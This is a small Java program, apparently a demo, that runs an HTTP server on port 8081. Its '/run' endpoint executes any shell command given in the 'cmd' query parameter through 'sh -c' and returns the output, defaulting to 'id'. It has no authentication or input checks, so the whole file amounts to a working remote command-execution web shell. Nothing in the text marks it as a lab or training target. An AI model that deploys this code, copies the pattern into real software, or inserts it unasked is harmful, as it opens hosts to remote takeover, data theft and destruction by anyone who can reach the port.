package demo;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;

public class App {
  public static void main(String[] args) throws Exception {
    HttpServer server = HttpServer.create(new InetSocketAddress(8081), 0);
    server.createContext("/run", App::runCommand);
    server.start();
  }

  private static void runCommand(HttpExchange exchange) throws java.io.IOException {
    String cmd = param(exchange.getRequestURI().getRawQuery(), "cmd");
    if (cmd.isBlank()) cmd = "id";
    Process process = Runtime.getRuntime().exec(new String[] {"sh", "-c", cmd});
    String output;
    try (InputStream in = process.getInputStream()) {
      output = new String(in.readAllBytes(), StandardCharsets.UTF_8);
    }
    exchange.sendResponseHeaders(200, output.getBytes(StandardCharsets.UTF_8).length);
    exchange.getResponseBody().write(output.getBytes(StandardCharsets.UTF_8));
    exchange.close();
  }

  private static String param(String query, String key) {
    if (query == null) return "";
    for (String part : query.split("&")) {
      String[] pair = part.split("=", 2);
      if (pair.length == 2 && pair[0].equals(key)) {
        return URLDecoder.decode(pair[1], StandardCharsets.UTF_8);
      }
    }
    return "";
  }
}
